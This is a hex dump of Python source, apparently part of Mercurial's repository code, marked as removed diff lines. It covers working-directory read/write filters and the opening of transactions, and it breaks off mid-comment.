-00014060: 726e 2073 656c 662e 6469 7273 7461 7465  rn self.dirstate
-00014070: 2e70 6174 6874 6f28 662c 2063 7764 290a  .pathto(f, cwd).
-00014080: 0a20 2020 2064 6566 205f 6c6f 6164 6669  .    def _loadfi
-00014090: 6c74 6572 2873 656c 662c 2066 696c 7465  lter(self, filte
-000140a0: 7229 3a0a 2020 2020 2020 2020 6966 2066  r):.        if f
-000140b0: 696c 7465 7220 6e6f 7420 696e 2073 656c  ilter not in sel
-000140c0: 662e 5f66 696c 7465 7270 6174 733a 0a20  f._filterpats:. 
-000140d0: 2020 2020 2020 2020 2020 206c 203d 205b             l = [
-000140e0: 5d0a 2020 2020 2020 2020 2020 2020 666f  ].            fo
-000140f0: 7220 7061 742c 2063 6d64 2069 6e20 7365  r pat, cmd in se
-00014100: 6c66 2e75 692e 636f 6e66 6967 6974 656d  lf.ui.configitem
-00014110: 7328 6669 6c74 6572 293a 0a20 2020 2020  s(filter):.     
-00014120: 2020 2020 2020 2020 2020 2069 6620 636d             if cm
-00014130: 6420 3d3d 2062 2721 273a 0a20 2020 2020  d == b'!':.     
-00014140: 2020 2020 2020 2020 2020 2020 2020 2063                 c
-00014150: 6f6e 7469 6e75 650a 2020 2020 2020 2020  ontinue.        
-00014160: 2020 2020 2020 2020 6d66 203d 206d 6174          mf = mat
-00014170: 6368 6d6f 642e 6d61 7463 6828 7365 6c66  chmod.match(self
-00014180: 2e72 6f6f 742c 2062 2727 2c20 5b70 6174  .root, b'', [pat
-00014190: 5d29 0a20 2020 2020 2020 2020 2020 2020  ]).             
-000141a0: 2020 2066 6e20 3d20 4e6f 6e65 0a20 2020     fn = None.   
-000141b0: 2020 2020 2020 2020 2020 2020 2070 6172               par
-000141c0: 616d 7320 3d20 636d 640a 2020 2020 2020  ams = cmd.      
-000141d0: 2020 2020 2020 2020 2020 666f 7220 6e61            for na
-000141e0: 6d65 2c20 6669 6c74 6572 666e 2069 6e20  me, filterfn in 
-000141f0: 7365 6c66 2e5f 6461 7461 6669 6c74 6572  self._datafilter
-00014200: 732e 6974 656d 7328 293a 0a20 2020 2020  s.items():.     
-00014210: 2020 2020 2020 2020 2020 2020 2020 2069                 i
-00014220: 6620 636d 642e 7374 6172 7473 7769 7468  f cmd.startswith
-00014230: 286e 616d 6529 3a0a 2020 2020 2020 2020  (name):.        
-00014240: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00014250: 666e 203d 2066 696c 7465 7266 6e0a 2020  fn = filterfn.  
-00014260: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00014270: 2020 2020 2020 7061 7261 6d73 203d 2063        params = c
-00014280: 6d64 5b6c 656e 286e 616d 6529 203a 5d2e  md[len(name) :].
-00014290: 6c73 7472 6970 2829 0a20 2020 2020 2020  lstrip().       
-000142a0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000142b0: 2062 7265 616b 0a20 2020 2020 2020 2020   break.         
-000142c0: 2020 2020 2020 2069 6620 6e6f 7420 666e         if not fn
-000142d0: 3a0a 2020 2020 2020 2020 2020 2020 2020  :.              
-000142e0: 2020 2020 2020 666e 203d 206c 616d 6264        fn = lambd
-000142f0: 6120 732c 2063 2c20 2a2a 6b77 6172 6773  a s, c, **kwargs
-00014300: 3a20 7072 6f63 7574 696c 2e66 696c 7465  : procutil.filte
-00014310: 7228 732c 2063 290a 2020 2020 2020 2020  r(s, c).        
-00014320: 2020 2020 2020 2020 2020 2020 666e 2e5f              fn._
-00014330: 5f6e 616d 655f 5f20 3d20 2763 6f6d 6d61  _name__ = 'comma
-00014340: 6e64 6669 6c74 6572 270a 2020 2020 2020  ndfilter'.      
-00014350: 2020 2020 2020 2020 2020 2320 5772 6170            # Wrap
-00014360: 206f 6c64 2066 696c 7465 7273 206e 6f74   old filters not
-00014370: 2073 7570 706f 7274 696e 6720 6b65 7977   supporting keyw
-00014380: 6f72 6420 6172 6775 6d65 6e74 730a 2020  ord arguments.  
-00014390: 2020 2020 2020 2020 2020 2020 2020 6966                if
-000143a0: 206e 6f74 2070 7963 6f6d 7061 742e 6765   not pycompat.ge
-000143b0: 7461 7267 7370 6563 2866 6e29 5b32 5d3a  targspec(fn)[2]:
-000143c0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-000143d0: 2020 2020 206f 6c64 666e 203d 2066 6e0a       oldfn = fn.
-000143e0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000143f0: 2020 2020 666e 203d 206c 616d 6264 6120      fn = lambda 
-00014400: 732c 2063 2c20 6f6c 6466 6e3d 6f6c 6466  s, c, oldfn=oldf
-00014410: 6e2c 202a 2a6b 7761 7267 733a 206f 6c64  n, **kwargs: old
-00014420: 666e 2873 2c20 6329 0a20 2020 2020 2020  fn(s, c).       
-00014430: 2020 2020 2020 2020 2020 2020 2066 6e2e               fn.
-00014440: 5f5f 6e61 6d65 5f5f 203d 2027 636f 6d70  __name__ = 'comp
-00014450: 6174 2d27 202b 206f 6c64 666e 2e5f 5f6e  at-' + oldfn.__n
-00014460: 616d 655f 5f0a 2020 2020 2020 2020 2020  ame__.          
-00014470: 2020 2020 2020 6c2e 6170 7065 6e64 2828        l.append((
-00014480: 6d66 2c20 666e 2c20 7061 7261 6d73 2929  mf, fn, params))
-00014490: 0a20 2020 2020 2020 2020 2020 2073 656c  .            sel
-000144a0: 662e 5f66 696c 7465 7270 6174 735b 6669  f._filterpats[fi
-000144b0: 6c74 6572 5d20 3d20 6c0a 2020 2020 2020  lter] = l.      
-000144c0: 2020 7265 7475 726e 2073 656c 662e 5f66    return self._f
-000144d0: 696c 7465 7270 6174 735b 6669 6c74 6572  ilterpats[filter
-000144e0: 5d0a 0a20 2020 2064 6566 205f 6669 6c74  ]..    def _filt
-000144f0: 6572 2873 656c 662c 2066 696c 7465 7270  er(self, filterp
-00014500: 6174 732c 2066 696c 656e 616d 652c 2064  ats, filename, d
-00014510: 6174 6129 3a0a 2020 2020 2020 2020 666f  ata):.        fo
-00014520: 7220 6d66 2c20 666e 2c20 636d 6420 696e  r mf, fn, cmd in
-00014530: 2066 696c 7465 7270 6174 733a 0a20 2020   filterpats:.   
-00014540: 2020 2020 2020 2020 2069 6620 6d66 2866           if mf(f
-00014550: 696c 656e 616d 6529 3a0a 2020 2020 2020  ilename):.      
-00014560: 2020 2020 2020 2020 2020 7365 6c66 2e75            self.u
-00014570: 692e 6465 6275 6728 0a20 2020 2020 2020  i.debug(.       
-00014580: 2020 2020 2020 2020 2020 2020 2062 2266               b"f
-00014590: 696c 7465 7269 6e67 2025 7320 7468 726f  iltering %s thro
-000145a0: 7567 6820 2573 5c6e 220a 2020 2020 2020  ugh %s\n".      
-000145b0: 2020 2020 2020 2020 2020 2020 2020 2520                % 
-000145c0: 2866 696c 656e 616d 652c 2063 6d64 206f  (filename, cmd o
-000145d0: 7220 7079 636f 6d70 6174 2e73 7973 6279  r pycompat.sysby
-000145e0: 7465 7328 666e 2e5f 5f6e 616d 655f 5f29  tes(fn.__name__)
-000145f0: 290a 2020 2020 2020 2020 2020 2020 2020  ).              
-00014600: 2020 290a 2020 2020 2020 2020 2020 2020    ).            
-00014610: 2020 2020 6461 7461 203d 2066 6e28 6461      data = fn(da
-00014620: 7461 2c20 636d 642c 2075 693d 7365 6c66  ta, cmd, ui=self
-00014630: 2e75 692c 2072 6570 6f3d 7365 6c66 2c20  .ui, repo=self, 
-00014640: 6669 6c65 6e61 6d65 3d66 696c 656e 616d  filename=filenam
-00014650: 6529 0a20 2020 2020 2020 2020 2020 2020  e).             
-00014660: 2020 2062 7265 616b 0a0a 2020 2020 2020     break..      
-00014670: 2020 7265 7475 726e 2064 6174 610a 0a20    return data.. 
-00014680: 2020 2040 756e 6669 6c74 6572 6564 7072     @unfilteredpr
-00014690: 6f70 6572 7479 6361 6368 650a 2020 2020  opertycache.    
-000146a0: 6465 6620 5f65 6e63 6f64 6566 696c 7465  def _encodefilte
-000146b0: 7270 6174 7328 7365 6c66 293a 0a20 2020  rpats(self):.   
-000146c0: 2020 2020 2072 6574 7572 6e20 7365 6c66       return self
-000146d0: 2e5f 6c6f 6164 6669 6c74 6572 2862 2765  ._loadfilter(b'e
-000146e0: 6e63 6f64 6527 290a 0a20 2020 2040 756e  ncode')..    @un
-000146f0: 6669 6c74 6572 6564 7072 6f70 6572 7479  filteredproperty
-00014700: 6361 6368 650a 2020 2020 6465 6620 5f64  cache.    def _d
-00014710: 6563 6f64 6566 696c 7465 7270 6174 7328  ecodefilterpats(
-00014720: 7365 6c66 293a 0a20 2020 2020 2020 2072  self):.        r
-00014730: 6574 7572 6e20 7365 6c66 2e5f 6c6f 6164  eturn self._load
-00014740: 6669 6c74 6572 2862 2764 6563 6f64 6527  filter(b'decode'
-00014750: 290a 0a20 2020 2064 6566 2061 6464 6461  )..    def addda
-00014760: 7461 6669 6c74 6572 2873 656c 662c 206e  tafilter(self, n
-00014770: 616d 652c 2066 696c 7465 7229 3a0a 2020  ame, filter):.  
-00014780: 2020 2020 2020 7365 6c66 2e5f 6461 7461        self._data
-00014790: 6669 6c74 6572 735b 6e61 6d65 5d20 3d20  filters[name] = 
-000147a0: 6669 6c74 6572 0a0a 2020 2020 6465 6620  filter..    def 
-000147b0: 7772 6561 6428 7365 6c66 2c20 6669 6c65  wread(self, file
-000147c0: 6e61 6d65 3a20 6279 7465 7329 202d 3e20  name: bytes) -> 
-000147d0: 6279 7465 733a 0a20 2020 2020 2020 2069  bytes:.        i
-000147e0: 6620 7365 6c66 2e77 7666 732e 6973 6c69  f self.wvfs.isli
-000147f0: 6e6b 2866 696c 656e 616d 6529 3a0a 2020  nk(filename):.  
-00014800: 2020 2020 2020 2020 2020 6461 7461 203d            data =
-00014810: 2073 656c 662e 7776 6673 2e72 6561 646c   self.wvfs.readl
-00014820: 696e 6b28 6669 6c65 6e61 6d65 290a 2020  ink(filename).  
-00014830: 2020 2020 2020 656c 7365 3a0a 2020 2020        else:.    
-00014840: 2020 2020 2020 2020 6461 7461 203d 2073          data = s
-00014850: 656c 662e 7776 6673 2e72 6561 6428 6669  elf.wvfs.read(fi
-00014860: 6c65 6e61 6d65 290a 2020 2020 2020 2020  lename).        
-00014870: 7265 7475 726e 2073 656c 662e 5f66 696c  return self._fil
-00014880: 7465 7228 7365 6c66 2e5f 656e 636f 6465  ter(self._encode
-00014890: 6669 6c74 6572 7061 7473 2c20 6669 6c65  filterpats, file
-000148a0: 6e61 6d65 2c20 6461 7461 290a 0a20 2020  name, data)..   
-000148b0: 2064 6566 2077 7772 6974 6528 0a20 2020   def wwrite(.   
-000148c0: 2020 2020 2073 656c 662c 0a20 2020 2020       self,.     
-000148d0: 2020 2066 696c 656e 616d 653a 2062 7974     filename: byt
-000148e0: 6573 2c0a 2020 2020 2020 2020 6461 7461  es,.        data
-000148f0: 3a20 6279 7465 732c 0a20 2020 2020 2020  : bytes,.       
-00014900: 2066 6c61 6773 3a20 6279 7465 732c 0a20   flags: bytes,. 
-00014910: 2020 2020 2020 2062 6163 6b67 726f 756e         backgroun
-00014920: 6463 6c6f 7365 3d46 616c 7365 2c0a 2020  dclose=False,.  
-00014930: 2020 2020 2020 2a2a 6b77 6172 6773 0a20        **kwargs. 
-00014940: 2020 2029 202d 3e20 696e 743a 0a20 2020     ) -> int:.   
-00014950: 2020 2020 2022 2222 7772 6974 6520 6060       """write ``
-00014960: 6461 7461 6060 2069 6e74 6f20 6060 6669  data`` into ``fi
-00014970: 6c65 6e61 6d65 6060 2069 6e20 7468 6520  lename`` in the 
-00014980: 776f 726b 696e 6720 6469 7265 6374 6f72  working director
-00014990: 790a 0a20 2020 2020 2020 2054 6869 7320  y..        This 
-000149a0: 7265 7475 726e 7320 6c65 6e67 7468 206f  returns length o
-000149b0: 6620 7772 6974 7465 6e20 286d 6179 6265  f written (maybe
-000149c0: 2064 6563 6f64 6564 2920 6461 7461 2e0a   decoded) data..
-000149d0: 2020 2020 2020 2020 2222 220a 2020 2020          """.    
-000149e0: 2020 2020 6461 7461 203d 2073 656c 662e      data = self.
-000149f0: 5f66 696c 7465 7228 7365 6c66 2e5f 6465  _filter(self._de
-00014a00: 636f 6465 6669 6c74 6572 7061 7473 2c20  codefilterpats, 
-00014a10: 6669 6c65 6e61 6d65 2c20 6461 7461 290a  filename, data).
-00014a20: 2020 2020 2020 2020 6966 2062 276c 2720          if b'l' 
-00014a30: 696e 2066 6c61 6773 3a0a 2020 2020 2020  in flags:.      
-00014a40: 2020 2020 2020 7365 6c66 2e77 7666 732e        self.wvfs.
-00014a50: 7379 6d6c 696e 6b28 6461 7461 2c20 6669  symlink(data, fi
-00014a60: 6c65 6e61 6d65 290a 2020 2020 2020 2020  lename).        
-00014a70: 656c 7365 3a0a 2020 2020 2020 2020 2020  else:.          
-00014a80: 2020 7365 6c66 2e77 7666 732e 7772 6974    self.wvfs.writ
-00014a90: 6528 0a20 2020 2020 2020 2020 2020 2020  e(.             
-00014aa0: 2020 2066 696c 656e 616d 652c 2064 6174     filename, dat
-00014ab0: 612c 2062 6163 6b67 726f 756e 6463 6c6f  a, backgroundclo
-00014ac0: 7365 3d62 6163 6b67 726f 756e 6463 6c6f  se=backgroundclo
-00014ad0: 7365 2c20 2a2a 6b77 6172 6773 0a20 2020  se, **kwargs.   
-00014ae0: 2020 2020 2020 2020 2029 0a20 2020 2020           ).     
-00014af0: 2020 2020 2020 2069 6620 6227 7827 2069         if b'x' i
-00014b00: 6e20 666c 6167 733a 0a20 2020 2020 2020  n flags:.       
-00014b10: 2020 2020 2020 2020 2073 656c 662e 7776           self.wv
-00014b20: 6673 2e73 6574 666c 6167 7328 6669 6c65  fs.setflags(file
-00014b30: 6e61 6d65 2c20 4661 6c73 652c 2054 7275  name, False, Tru
-00014b40: 6529 0a20 2020 2020 2020 2020 2020 2065  e).            e
-00014b50: 6c73 653a 0a20 2020 2020 2020 2020 2020  lse:.           
-00014b60: 2020 2020 2073 656c 662e 7776 6673 2e73       self.wvfs.s
-00014b70: 6574 666c 6167 7328 6669 6c65 6e61 6d65  etflags(filename
-00014b80: 2c20 4661 6c73 652c 2046 616c 7365 290a  , False, False).
-00014b90: 2020 2020 2020 2020 7265 7475 726e 206c          return l
-00014ba0: 656e 2864 6174 6129 0a0a 2020 2020 6465  en(data)..    de
-00014bb0: 6620 7777 7269 7465 6461 7461 2873 656c  f wwritedata(sel
-00014bc0: 662c 2066 696c 656e 616d 653a 2062 7974  f, filename: byt
-00014bd0: 6573 2c20 6461 7461 3a20 6279 7465 7329  es, data: bytes)
-00014be0: 202d 3e20 6279 7465 733a 0a20 2020 2020   -> bytes:.     
-00014bf0: 2020 2072 6574 7572 6e20 7365 6c66 2e5f     return self._
-00014c00: 6669 6c74 6572 2873 656c 662e 5f64 6563  filter(self._dec
-00014c10: 6f64 6566 696c 7465 7270 6174 732c 2066  odefilterpats, f
-00014c20: 696c 656e 616d 652c 2064 6174 6129 0a0a  ilename, data)..
-00014c30: 2020 2020 6465 6620 6375 7272 656e 7474      def currentt
-00014c40: 7261 6e73 6163 7469 6f6e 2873 656c 6629  ransaction(self)
-00014c50: 3a0a 2020 2020 2020 2020 2222 2272 6574  :.        """ret
-00014c60: 7572 6e20 7468 6520 6375 7272 656e 7420  urn the current 
-00014c70: 7472 616e 7361 6374 696f 6e20 6f72 204e  transaction or N
-00014c80: 6f6e 6520 6966 206e 6f6e 2065 7869 7374  one if non exist
-00014c90: 7322 2222 0a20 2020 2020 2020 2069 6620  s""".        if 
-00014ca0: 7365 6c66 2e5f 7472 616e 7372 6566 3a0a  self._transref:.
-00014cb0: 2020 2020 2020 2020 2020 2020 7472 203d              tr =
-00014cc0: 2073 656c 662e 5f74 7261 6e73 7265 6628   self._transref(
-00014cd0: 290a 2020 2020 2020 2020 656c 7365 3a0a  ).        else:.
-00014ce0: 2020 2020 2020 2020 2020 2020 7472 203d              tr =
-00014cf0: 204e 6f6e 650a 0a20 2020 2020 2020 2069   None..        i
-00014d00: 6620 7472 2061 6e64 2074 722e 7275 6e6e  f tr and tr.runn
-00014d10: 696e 6728 293a 0a20 2020 2020 2020 2020  ing():.         
-00014d20: 2020 2072 6574 7572 6e20 7472 0a20 2020     return tr.   
-00014d30: 2020 2020 2072 6574 7572 6e20 4e6f 6e65       return None
-00014d40: 0a0a 2020 2020 6465 6620 7472 616e 7361  ..    def transa
-00014d50: 6374 696f 6e28 7365 6c66 2c20 6465 7363  ction(self, desc
-00014d60: 2c20 7265 706f 7274 3d4e 6f6e 6529 3a0a  , report=None):.
-00014d70: 2020 2020 2020 2020 6966 2073 656c 662e          if self.
-00014d80: 7569 2e63 6f6e 6669 6762 6f6f 6c28 6227  ui.configbool(b'
-00014d90: 6465 7665 6c27 2c20 6227 616c 6c2d 7761  devel', b'all-wa
-00014da0: 726e 696e 6773 2729 206f 7220 7365 6c66  rnings') or self
-00014db0: 2e75 692e 636f 6e66 6967 626f 6f6c 280a  .ui.configbool(.
-00014dc0: 2020 2020 2020 2020 2020 2020 6227 6465              b'de
-00014dd0: 7665 6c27 2c20 6227 6368 6563 6b2d 6c6f  vel', b'check-lo
-00014de0: 636b 7327 0a20 2020 2020 2020 2029 3a0a  cks'.        ):.
-00014df0: 2020 2020 2020 2020 2020 2020 6966 2073              if s
-00014e00: 656c 662e 5f63 7572 7265 6e74 6c6f 636b  elf._currentlock
-00014e10: 2873 656c 662e 5f6c 6f63 6b72 6566 2920  (self._lockref) 
-00014e20: 6973 204e 6f6e 653a 0a20 2020 2020 2020  is None:.       
-00014e30: 2020 2020 2020 2020 2072 6169 7365 2065           raise e
-00014e40: 7272 6f72 2e50 726f 6772 616d 6d69 6e67  rror.Programming
-00014e50: 4572 726f 7228 6227 7472 616e 7361 6374  Error(b'transact
-00014e60: 696f 6e20 7265 7175 6972 6573 206c 6f63  ion requires loc
-00014e70: 6b69 6e67 2729 0a20 2020 2020 2020 2074  king').        t
-00014e80: 7220 3d20 7365 6c66 2e63 7572 7265 6e74  r = self.current
-00014e90: 7472 616e 7361 6374 696f 6e28 290a 2020  transaction().  
-00014ea0: 2020 2020 2020 6966 2074 7220 6973 206e        if tr is n
-00014eb0: 6f74 204e 6f6e 653a 0a20 2020 2020 2020  ot None:.       
-00014ec0: 2020 2020 2072 6574 7572 6e20 7472 2e6e       return tr.n
-00014ed0: 6573 7428 6e61 6d65 3d64 6573 6329 0a0a  est(name=desc)..
-00014ee0: 2020 2020 2020 2020 2320 6162 6f72 7420          # abort 
-00014ef0: 6865 7265 2069 6620 7468 6520 6a6f 7572  here if the jour
-00014f00: 6e61 6c20 616c 7265 6164 7920 6578 6973  nal already exis
-00014f10: 7473 0a20 2020 2020 2020 2069 6620 7365  ts.        if se
-00014f20: 6c66 2e73 7666 732e 6578 6973 7473 2862  lf.svfs.exists(b
-00014f30: 226a 6f75 726e 616c 2229 3a0a 2020 2020  "journal"):.    
-00014f40: 2020 2020 2020 2020 7261 6973 6520 6572          raise er
-00014f50: 726f 722e 5265 706f 4572 726f 7228 0a20  ror.RepoError(. 
-00014f60: 2020 2020 2020 2020 2020 2020 2020 205f                 _
-00014f70: 2862 2261 6261 6e64 6f6e 6564 2074 7261  (b"abandoned tra
-00014f80: 6e73 6163 7469 6f6e 2066 6f75 6e64 2229  nsaction found")
-00014f90: 2c0a 2020 2020 2020 2020 2020 2020 2020  ,.              
-00014fa0: 2020 6869 6e74 3d5f 2862 2272 756e 2027    hint=_(b"run '
-00014fb0: 6867 2072 6563 6f76 6572 2720 746f 2063  hg recover' to c
-00014fc0: 6c65 616e 2075 7020 7472 616e 7361 6374  lean up transact
-00014fd0: 696f 6e22 292c 0a20 2020 2020 2020 2020  ion"),.         
-00014fe0: 2020 2029 0a0a 2020 2020 2020 2020 2320     )..        # 
-00014ff0: 4174 2074 6861 7420 706f 696e 7420 796f  At that point yo
-00015000: 7572 2064 6972 7374 6174 6520 7368 6f75  ur dirstate shou
-00015010: 6c64 2062 6520 636c 6561 6e3a 0a20 2020  ld be clean:.   
-00015020: 2020 2020 2023 0a20 2020 2020 2020 2023       #.        #
-00015030: 202d 2049 6620 796f 7520 646f 6e27 7420   - If you don't 
-00015040: 6861 7665 2074 6865 2077 6c6f 636b 2c20  have the wlock, 
-00015050: 7768 7920 776f 756c 6420 796f 7520 7374  why would you st
-00015060: 696c 6c20 6861 7665 2061 2064 6972 7479  ill have a dirty
-00015070: 0a20 2020 2020 2020 2023 2020 2064 6972  .        #   dir
-00015080: 7374 6174 6520 3f0a 2020 2020 2020 2020  state ?.        
-00015090: 230a 2020 2020 2020 2020 2320 2d20 4966  #.        # - If
-000150a0: 2079 6f75 2068 6f6c 6420 7468 6520 776c   you hold the wl
-000150b0: 6f63 6b2c 2079 6f75 2073 686f 756c 6420  ock, you should 
-000150c0: 6e6f 7420 6265 206f 7065 6e69 6e67 2061  not be opening a
-000150d0: 2074 7261 6e73 6163 7469 6f6e 2069 6e0a   transaction in.
-000150e0: 2020 2020 2020 2020 2320 2020 7468 6520          #   the 
-000150f0: 6d69 6464 6c65 206f 6620 6120 6064 6973  middle of a `dis
-00015100: 7461 7465 2e63 6861 6e67 696e 675f 2a60  tate.changing_*`
-00015110: 2062 6c6f 636b 2e20 5468 6520 7472 616e   block. The tran
-00015120: 7361 6374 696f 6e20 6e65 6564 7320 746f  saction needs to
-00015130: 0a20 2020 2020 2020 2023 2020 2062 6520  .        #   be 
-00015140: 6f70 656e 2062 6566 6f72 6520 7468 6174  open before that
-00015150: 2061 6e64 2077 7261 7020 7468 6520 6368   and wrap the ch
-00015160: 616e 6765 2d63 6f6e 7465 7874 2e0a 2020  ange-context..  
-00015170: 2020 2020 2020 230a 2020 2020 2020 2020        #.        
-00015180: 2320 2d20 4966 2079 6f75 2061 7265 206e  # - If you are n
-00015190: 6f74 2077 6974 6869 6e20 6120 6064 6972  ot within a `dir
-000151a0: 7374 6174 652e 6368 616e 6769 6e67 5f2a  state.changing_*
-000151b0: 6020 636f 6e74 6578 742c 2077 6879 2069  ` context, why i
-000151c0: 7320 6f75 720a 2020 2020 2020 2020 2320  s our.        # 
-000151d0: 2020 6469 7273 7461 7465 2064 6972 7479    dirstate dirty
-000151e0: 3f0a 2020 2020 2020 2020 6966 2073 656c  ?.        if sel
-000151f0: 662e 6469 7273 7461 7465 2e5f 6469 7274  f.dirstate._dirt
-00015200: 793a 0a20 2020 2020 2020 2020 2020 206d  y:.            m
-00015210: 203d 2022 6361 6e6e 6f74 206f 7065 6e20   = "cannot open 
-00015220: 6120 7472 616e 7361 6374 696f 6e20 7769  a transaction wi
-00015230: 7468 2061 2064 6972 7479 2064 6972 7374  th a dirty dirst
-00015240: 6174 6522 0a20 2020 2020 2020 2020 2020  ate".           
-00015250: 2072 6169 7365 2065 7272 6f72 2e50 726f   raise error.Pro
-00015260: 6772 616d 6d69 6e67 4572 726f 7228 6d29  grammingError(m)
-00015270: 0a0a 2020 2020 2020 2020 6964 6261 7365  ..        idbase
-00015280: 203d 2062 2225 2e34 3066 2325 6622 2025   = b"%.40f#%f" %
-00015290: 2028 7261 6e64 6f6d 2e72 616e 646f 6d28   (random.random(
-000152a0: 292c 2074 696d 652e 7469 6d65 2829 290a  ), time.time()).
-000152b0: 2020 2020 2020 2020 6861 203d 2068 6578          ha = hex
-000152c0: 2868 6173 6875 7469 6c2e 7368 6131 2869  (hashutil.sha1(i
-000152d0: 6462 6173 6529 2e64 6967 6573 7428 2929  dbase).digest())
-000152e0: 0a20 2020 2020 2020 2074 786e 6964 203d  .        txnid =
-000152f0: 2062 2754 584e 3a27 202b 2068 610a 2020   b'TXN:' + ha.  
-00015300: 2020 2020 2020 7365 6c66 2e68 6f6f 6b28        self.hook(
-00015310: 6227 7072 6574 786e 6f70 656e 272c 2074  b'pretxnopen', t
-00015320: 6872 6f77 3d54 7275 652c 2074 786e 6e61  hrow=True, txnna
-00015330: 6d65 3d64 6573 632c 2074 786e 6964 3d74  me=desc, txnid=t
-00015340: 786e 6964 290a 0a20 2020 2020 2020 2073  xnid)..        s
-00015350: 656c 662e 5f77 7269 7465 6a6f 7572 6e61  elf._writejourna
-00015360: 6c28 6465 7363 290a 2020 2020 2020 2020  l(desc).        
-00015370: 6966 2072 6570 6f72 743a 0a20 2020 2020  if report:.     
-00015380: 2020 2020 2020 2072 7020 3d20 7265 706f         rp = repo
-00015390: 7274 0a20 2020 2020 2020 2065 6c73 653a  rt.        else:
-000153a0: 0a20 2020 2020 2020 2020 2020 2072 7020  .            rp 
-000153b0: 3d20 7365 6c66 2e75 692e 7761 726e 0a20  = self.ui.warn. 
-000153c0: 2020 2020 2020 2076 6673 6d61 7020 3d20         vfsmap = 
-000153d0: 7365 6c66 2e76 6673 5f6d 6170 0a20 2020  self.vfs_map.   
-000153e0: 2020 2020 2023 2077 6520 6d75 7374 2061       # we must a
-000153f0: 766f 6964 2063 7963 6c69 6320 7265 6665  void cyclic refe
-00015400: 7265 6e63 6520 6265 7477 6565 6e20 7265  rence between re
-00015410: 706f 2061 6e64 2074 7261 6e73 6163 7469  po and transacti
-00015420: 6f6e 2e0a 2020 2020 2020 2020 7265 706f  on..        repo
-00015430: 7265 6620 3d20 7765 616b 7265 662e 7265  ref = weakref.re
-00015440: 6628 7365 6c66 290a 2020 2020 2020 2020  f(self).        
-00015450: 2320 436f 6465 2074 6f20 7472 6163 6b20  # Code to track 
-00015460: 7461 6720 6d6f 7665 6d65 6e74 0a20 2020  tag movement.   
-00015470: 2020 2020 2023 0a20 2020 2020 2020 2023       #.        #
-00015480: 2053 696e 6365 2074 6167 7320 6172 6520   Since tags are 
-00015490: 616c 6c20 6861 6e64 6c65 6420 6173 2066  all handled as f
-000154a0: 696c 6520 636f 6e74 656e 742c 2069 7420  ile content, it 
-000154b0: 6973 2061 6374 7561 6c6c 7920 7175 6974  is actually quit
-000154c0: 6520 6861 7264 0a20 2020 2020 2020 2023  e hard.        #
-000154d0: 2074 6f20 7472 6163 6b20 7468 6573 6520   to track these 
-000154e0: 6d6f 7665 6d65 6e74 2066 726f 6d20 6120  movement from a 
-000154f0: 636f 6465 2070 6572 7370 6563 7469 7665  code perspective
-00015500: 2e20 536f 2077 6520 6661 6c6c 6261 636b  . So we fallback
-00015510: 2074 6f20 610a 2020 2020 2020 2020 2320   to a.        # 
-00015520: 7472 6163 6b69 6e67 2061 7420 7468 6520  tracking at the 
-00015530: 7265 706f 7369 746f 7279 206c 6576 656c  repository level
-00015540: 2e20 4f6e 6520 636f 756c 6420 656e 7669  . One could envi
-00015550: 7369 6f6e 2074 6f20 7472 6163 6b20 6368  sion to track ch
-00015560: 616e 6765 730a 2020 2020 2020 2020 2320  anges.        # 
-00015570: 746f 2074 6865 2027 2e68 6774 6167 7327  to the '.hgtags'
-00015580: 2066 696c 6520 7468 726f 7567 6820 6368   file through ch
-00015590: 616e 6765 6772 6f75 7020 6170 706c 7920  angegroup apply 
-000155a0: 6275 7420 7468 6174 2066 6169 6c73 2074  but that fails t
-000155b0: 6f0a 2020 2020 2020 2020 2320 636f 7065  o.        # cope
-000155c0: 2077 6974 6820 6361 7365 2077 6865 7265   with case where
-000155d0: 2074 7261 6e73 6163 7469 6f6e 2065 7870   transaction exp
-000155e0: 6f73 6520 6e65 7720 6865 6164 7320 7769  ose new heads wi
-000155f0: 7468 6f75 7420 6368 616e 6765 6772 6f75  thout changegrou
-00015600: 700a 2020 2020 2020 2020 2320 6265 696e  p.        # bein
-00015610: 6720 696e 766f 6c76 6564 2028 6567 3a20  g involved (eg: 
-00015620: 7068 6173 6520 6d6f 7665 6d65 6e74 292e  phase movement).
-00015630: 0a20 2020 2020 2020 2023 0a20 2020 2020  .        #.     
-00015640: 2020 2023 2046 6f72 206e 6f77 2c20 5765     # For now, We
-00015650: 2067 6174 6520 7468 6520 6665 6174 7572   gate the featur
-00015660: 6520 6265 6869 6e64 2061 2066 6c61 6720  e behind a flag 
-00015670: 7369 6e63 6520 7468 6973 206c 696b 656c  since this likel
-00015680: 7920 636f 6d65 730a 2020 2020 2020 2020  y comes.        
-00015690: 2320 7769 7468 2070 6572 666f 726d 616e  # with performan
-000156a0: 6365 2069 6d70 6163 7473 2e20 5468 6520  ce impacts. The 
-000156b0: 6375 7272 656e 7420 636f 6465 2072 756e  current code run
-000156c0: 206d 6f72 6520 6f66 7465 6e20 7468 616e   more often than
-000156d0: 206e 6565 6465 640a 2020 2020 2020 2020   needed.        
-000156e0: 2320 616e 6420 646f 206e 6f74 2075 7365  # and do not use
-000156f0: 2063 6163 6865 7320 6173 206d 7563 6820   caches as much 
-00015700: 6173 2069 7420 636f 756c 642e 2020 5468  as it could.  Th
-00015710: 6520 6375 7272 656e 7420 666f 6375 7320  e current focus 
-00015720: 6973 206f 6e0a 2020 2020 2020 2020 2320  is on.        # 
-00015730: 7468 6520 6265 6861 7669 6f72 206f 6620  the behavior of 
-00015740: 7468 6520 6665 6174 7572 6520 736f 2077  the feature so w
-00015750: 6520 6469 7361 626c 6520 6974 2062 7920  e disable it by 
-00015760: 6465 6661 756c 742e 2054 6865 2066 6c61  default. The fla
-00015770: 670a 2020 2020 2020 2020 2320 7769 6c6c  g.        # will
-00015780: 2062 6520 7265 6d6f 7665 6420 7768 656e   be removed when
-00015790: 2077 6520 6172 6520 6861 7070 7920 7769   we are happy wi
-000157a0: 7468 2074 6865 2070 6572 666f 726d 616e  th the performan
-000157b0: 6365 2069 6d70 6163 742e 0a20 2020 2020  ce impact..     
-000157c0: 2020 2023 0a20 2020 2020 2020 2023 204f     #.        # O
-000157d0: 6e63 6520 7468 6973 2066 6561 7475 7265  nce this feature
-000157e0: 2069 7320 6e6f 206c 6f6e 6765 7220 6578   is no longer ex
-000157f0: 7065 7269 6d65 6e74 616c 206d 6f76 6520  perimental move 
